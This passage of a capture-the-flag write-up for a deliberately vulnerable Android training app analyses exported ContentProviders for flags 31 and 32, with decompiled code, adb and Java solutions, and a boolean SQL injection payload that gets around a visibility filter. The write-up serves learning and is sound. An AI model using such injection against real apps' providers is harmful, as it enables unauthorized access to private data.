</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>uriMatcher2</span><span class=p>.</span><span class=na>addURI</span><span class=p>(</span><span class=n>AUTHORITY</span><span class=p>,</span><span class=w> </span><span class=s>&#34;flags&#34;</span><span class=p>,</span><span class=w> </span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>uriMatcher2</span><span class=p>.</span><span class=na>addURI</span><span class=p>(</span><span class=n>AUTHORITY</span><span class=p>,</span><span class=w> </span><span class=s>&#34;flag/#&#34;</span><span class=p>,</span><span class=w> </span><span class=n>2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w> </span><span class=c1>// android.content.ContentProvider</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Cursor</span><span class=w> </span><span class=nf>query</span><span class=p>(</span><span class=n>Uri</span><span class=w> </span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>strArr</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>strArr2</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>str2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>StringBuilder</span><span class=w> </span><span class=n>append</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuilder</span><span class=p>(</span><span class=s>&#34;Flag31Provider.query(&#39;&#34;</span><span class=p>).</span><span class=na>append</span><span class=p>(</span><span class=n>uri</span><span class=p>.</span><span class=na>getPath</span><span class=p>()).</span><span class=na>append</span><span class=p>(</span><span class=s>&#34;&#39;): &#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>UriMatcher</span><span class=w> </span><span class=n>uriMatcher2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>uriMatcher</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>SQLiteDatabase</span><span class=w> </span><span class=n>readableDatabase</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>dbHelper</span><span class=p>.</span><span class=na>getReadableDatabase</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>match</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>uriMatcher2</span><span class=p>.</span><span class=na>match</span><span class=p>(</span><span class=n>uri</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>match</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>1</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>IllegalArgumentException</span><span class=p>(</span><span class=s>&#34;FLAGS not implemented yet: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>uri</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>match</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>long</span><span class=w> </span><span class=n>parseId</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ContentUris</span><span class=p>.</span><span class=na>parseId</span><span class=p>(</span><span class=n>uri</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Log</span><span class=p>.</span><span class=na>i</span><span class=p>(</span><span class=s>&#34;Flag31&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;FLAG_ID: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>parseId</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>parseId</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>31</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>LogHelper</span><span class=w> </span><span class=n>logHelper</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>LogHelper</span><span class=p>(</span><span class=n>getContext</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>logHelper</span><span class=p>.</span><span class=na>addTag</span><span class=p>(</span><span class=n>uri</span><span class=p>.</span><span class=na>getPath</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>success</span><span class=p>(</span><span class=n>logHelper</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>readableDatabase</span><span class=p>.</span><span class=na>query</span><span class=p>(</span><span class=n>FlagDatabaseHelper</span><span class=p>.</span><span class=na>TABLE_FLAG</span><span class=p>,</span><span class=w> </span><span class=n>strArr</span><span class=p>,</span><span class=w> </span><span class=s>&#34;name=? AND visible=1&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=p>{</span><span class=s>&#34;flag&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>parseId</span><span class=p>},</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=n>str2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>The provider defines two URI patterns:</p><ul><li><code>content://io.hextree.flag31/flags</code> → Matches <code>FLAGS</code> (code <code>1</code>)</li><li><code>content://io.hextree.flag31/flag/#</code> → Matches <code>FLAG_ID</code> (code <code>2</code>), where <code>#</code> is a numeric ID</li></ul><p>so if we entered an id the second match will work if it&rsquo;s 31 so the Uri will be like <code>content://io.hextree.flag31/flag/31</code></p><h4 class="relative group">Solution<div id=solution-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-1 aria-label=Anchor>#</a></span></h4><p>ADB:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>adb shell content query --uri content://io.hextree.flag31/flag/31                                
</span></span></code></pre></div><p>Output: <code>Row: 0 _id=2, name=flag31, value=HXT{1111-qqqqqq-xxxxx-zzzz}, visible=1</code></p><p>Java</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Uri</span><span class=w> </span><span class=n>uri</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Uri</span><span class=p>.</span><span class=na>parse</span><span class=p>(</span><span class=s>&#34;content://io.hextree.flag31/flag/31&#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Cursor</span><span class=w> </span><span class=n>cursor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getContentResolver</span><span class=p>().</span><span class=na>query</span><span class=p>(</span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>moveToFirst</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>do</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>StringBuilder</span><span class=w> </span><span class=n>sb</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuilder</span><span class=p>();</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>cursor</span><span class=p>.</span><span class=na>getColumnCount</span><span class=p>();</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>sb</span><span class=p>.</span><span class=na>length</span><span class=p>()</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=n>sb</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=s>&#34;, &#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>sb</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>getColumnName</span><span class=p>(</span><span class=n>i</span><span class=p>)).</span><span class=na>append</span><span class=p>(</span><span class=s>&#34; = &#34;</span><span class=p>).</span><span class=na>append</span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>getString</span><span class=p>(</span><span class=n>i</span><span class=p>));</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=s>&#34;evil&#34;</span><span class=p>,</span><span class=w> </span><span class=n>sb</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>moveToNext</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><h3 class="relative group">Flag 32<div id=flag-32 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#flag-32 aria-label=Anchor>#</a></span></h3><h4 class="relative group">Code analysis<div id=code-analysis-2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#code-analysis-2 aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl> <span class=nt>&lt;provider</span>
</span></span><span class=line><span class=cl>    <span class=na>android:name=</span><span class=s>&#34;io.hextree.attacksurface.providers.Flag32Provider&#34;</span>
</span></span><span class=line><span class=cl>    <span class=na>android:enabled=</span><span class=s>&#34;true&#34;</span>
</span></span><span class=line><span class=cl>    <span class=na>android:exported=</span><span class=s>&#34;true&#34;</span>
</span></span><span class=line><span class=cl>    <span class=na>android:authorities=</span><span class=s>&#34;io.hextree.flag32&#34;</span>
</span></span><span class=line><span class=cl><span class=nt>/&gt;</span>
</span></span></code></pre></div><p>we can break this provider class into part to make reading it easier
##### 1. Individual Flag Query (Match == 2)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>match</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// Extract ID from URI (e.g., content://.../flag/32 → ID=32)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kt>long</span><span class=w> </span><span class=n>parseId</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ContentUris</span><span class=p>.</span><span class=na>parseId</span><span class=p>(</span><span class=n>uri</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Log</span><span class=p>.</span><span class=na>i</span><span class=p>(</span><span class=s>&#34;Flag32&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;FLAG_ID: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>parseId</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// Query database for specific flag</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>readableDatabase</span><span class=p>.</span><span class=na>query</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>FlagDatabaseHelper</span><span class=p>.</span><span class=na>TABLE_FLAG</span><span class=p>,</span><span class=w>  </span><span class=c1>// Table name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>strArr</span><span class=p>,</span><span class=w>                        </span><span class=c1>// Columns to return</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=s>&#34;name=? AND visible=1&#34;</span><span class=p>,</span><span class=w>        </span><span class=c1>// Only visible flags with matching name</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=p>{</span><span class=s>&#34;flag&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>parseId</span><span class=p>},</span><span class=c1>// Search for &#34;flag32&#34; if ID=32</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=n>str2</span><span class=w>               </span><span class=c1>// GroupBy, Having, OrderBy</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>Handles URIs like <code>content://provider/flag/32</code> as it Extracts the number (32) and searches for <code>flag32</code> Only returns results where <code>visible=1</code> (hidden flags won&rsquo;t show)</p><h5 class="relative group">2. General Flags Query (Match == 1)<div id=2-general-flags-query-match--1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#2-general-flags-query-match--1 aria-label=Anchor>#</a></span></h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// Build base query for visible flags</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>String</span><span class=w> </span><span class=n>str3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;visible=1&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=n>str</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=s>&#34; AND (&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>str</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;)&#34;</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>// Execute query on all flags</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Cursor</span><span class=w> </span><span class=n>query</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>readableDatabase</span><span class=p>.</span><span class=na>query</span><span class=p>(</span><span class=n>FlagDatabaseHelper</span><span class=p>.</span><span class=na>TABLE_FLAG</span><span class=p>,</span><span class=w> </span><span class=n>strArr</span><span class=p>,</span><span class=w> </span><span class=n>str3</span><span class=p>,</span><span class=w> </span><span class=n>strArr2</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=n>str2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>containsFlag32</span><span class=p>(</span><span class=n>query</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>success</span><span class=p>(</span><span class=n>logHelper</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>query</span><span class=p>.</span><span class=na>requery</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>query</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p>This by Default shows all flags where <code>visible=1</code> and Can add extra filters through <code>str</code> parameter but also Has special handling for flag32 that triggers success</p><h5 class="relative group">3. Flag32 Checker<div id=3-flag32-checker class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#3-flag32-checker aria-label=Anchor>#</a></span></h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>containsFlag32</span><span class=p>(</span><span class=n>Cursor</span><span class=w> </span><span class=n>cursor</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cursor</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>columnIndex</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>cursor</span><span class=p>.</span><span class=na>getColumnIndex</span><span class=p>(</span><span class=n>FlagDatabaseHelper</span><span class=p>.</span><span class=na>COLUMN_NAME</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>moveToNext</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=s>&#34;flag32&#34;</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>getString</span><span class=p>(</span><span class=n>columnIndex</span><span class=p>)))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>It Scans the query results for any row named &ldquo;flag32&rdquo; so that Returns true only if flag32 exists and is visible</p><p><strong>IN SHORT</strong>:</p><p>This also defines the same matchers from the previous flags. The <code>query()</code> method can go into 2 ways:</p><ol><li><p>For Individual Flag Queries (FLAG_ID, match == 2)</p><ul><li>by Extracting the ID from the URI (e.g., <code>/flag/32</code> → ID 32) and query it with <code>visible=1</code> and returns if a match found</li></ul></li><li><p>For General Flags Query (FLAGS, match == 1)</p><ul><li>creating a base query with <code>visible=1</code> then Appends any additional selection criteria if provided and After executing the query, checks if the results contain &ldquo;flag32&rdquo; using <code>containsFlag32()</code></li><li>if found our success is called</li></ul></li></ol><div class=mermaid align=center><pre>
flowchart TD
    A[URI Received] --> B{Match URI Pattern}
    B -->|Match == 2| C[Individual Flag Query]
    B -->|Match == 1| D[General Flags Query]
    
    C --> C1[Extract ID from URI<br>example: /flag/32 to 32]
    C1 --> C2[Build query:<br>name=flag32 AND visible=1]
    C2 --> C3[Return single flag cursor]
    
    D --> D1[Build base query:<br>visible=1]
    D1 --> D2{Additional filters?}
    D2 -->|Yes| D3[Append to query]
    D2 -->|No| D4[Execute query]
    D3 --> D4
    D4 --> D5[Check for flag32]
    
    D5 --> E{containsFlag32?}
    E -->|Yes| F[Trigger success and<br>Requery cursor]
    E -->|No| G[Return original cursor]
    
    F --> M[Return refreshed cursor]
    
    style C fill:#d4f1f9,stroke:#333
    style D fill:#f9e4d4,stroke:#333
    style containsFlag32Check fill:#e8f9d4,stroke:#333
</pre></div><h4 class="relative group">Solution<div id=solution-2 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-2 aria-label=Anchor>#</a></span></h4><p>The key is in the second part cuz it constructs the filters for query and takes input directly and that makes it vulnerable to sql injection (Boolean based slqi)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>String</span><span class=w> </span><span class=n>str3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;visible=1&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=n>str</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=s>&#34; AND (&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>str</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;)&#34;</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Cursor</span><span class=w> </span><span class=n>query</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>readableDatabase</span><span class=p>.</span><span class=na>query</span><span class=p>(</span><span class=n>FlagDatabaseHelper</span><span class=p>.</span><span class=na>TABLE_FLAG</span><span class=p>,</span><span class=w> </span><span class=n>strArr</span><span class=p>,</span><span class=w> </span><span class=n>str3</span><span class=p>,</span><span class=w> </span><span class=n>strArr2</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=n>str2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>containsFlag32</span><span class=p>(</span><span class=n>query</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>success</span><span class=p>(</span><span class=n>logHelper</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>query</span><span class=p>.</span><span class=na>requery</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>query</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p>so</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>visible</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>AND</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=k>any</span><span class=w> </span><span class=n>thing</span><span class=p>)</span><span class=w> </span><span class=c1>--original
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>visible</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>AND</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=k>OR</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=c1>--what our payload looks like
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Uri</span><span class=w> </span><span class=n>uri</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Uri</span><span class=p>.</span><span class=na>parse</span><span class=p>(</span><span class=s>&#34;content://io.hextree.flag32/flags&#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Cursor</span><span class=w> </span><span class=n>cursor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getContentResolver</span><span class=p>().</span><span class=na>query</span><span class=p>(</span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=s>&#34;1=1) OR (1=1&#34;</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>moveToFirst</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>do</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>StringBuilder</span><span class=w> </span><span class=n>sb</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuilder</span><span class=p>();</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>cursor</span><span class=p>.</span><span class=na>getColumnCount</span><span class=p>();</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>sb</span><span class=p>.</span><span class=na>length</span><span class=p>()</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=n>sb</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=s>&#34;, &#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>sb</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>getColumnName</span><span class=p>(</span><span class=n>i</span><span class=p>)).</span><span class=na>append</span><span class=p>(</span><span class=s>&#34; = &#34;</span><span class=p>).</span><span class=na>append</span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>getString</span><span class=p>(</span><span class=n>i</span><span class=p>));</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=s>&#34;evil&#34;</span><span class=p>,</span><span class=w> </span><span class=n>sb</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w>  
